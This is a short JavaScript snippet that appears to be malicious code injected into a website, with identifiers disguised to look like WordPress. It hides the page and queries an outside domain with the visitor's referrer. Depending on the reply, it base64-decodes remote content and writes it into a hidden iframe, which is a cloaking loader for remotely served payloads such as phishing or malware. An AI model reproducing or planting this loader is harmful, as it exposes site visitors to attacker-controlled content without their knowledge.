var IFRAME_CLASS = 'verfghccdshgccaa';
var VERIFICATION_URL = 'https://twrpje.com/product/norsk-eiendomsmegler-olav-thon/cgfdkcsatutdj.php';

document.getElementById("wp-html") || document.write('<style id="wp-html" type="text/css">html {display:none;}</style>');

function show() {
  document.getElementById("wp-html").innerHTML = "html {display:block;}"
};

var d;

window.XMLHttpRequest ? d = new XMLHttpRequest : window.ActiveXObject && (d = new ActiveXObject("Microsoft.XMLHTTP"));

d.onreadystatechange = function() {
  if (4 == this.readyState) {
    if (200 == this.status) {
      var components = this.responseText.split(';');
      var styleData = components[2];

      if (/^1;/.test(this.responseText)) {
        var b = decodeURIComponent(atob(components[1]));
        var a = document.querySelector('.' + IFRAME_CLASS);
        a = a.contentWindow || a.contentDocument;
        a.document && (a = a.document);
        a.open();
        a.write(b);
        a.close();
      }

      var style = document.createElement('link');
      style.rel = 'stylesheet';
      style.href = 'arfjdgxcaznv.php?v=' + styleData;
      style.type = 'text/css';
      document.head.appendChild(style);
    }

    show();
  }
};

d.open("GET", VERIFICATION_URL + '?ref=' + document.referer, 1);
d.send()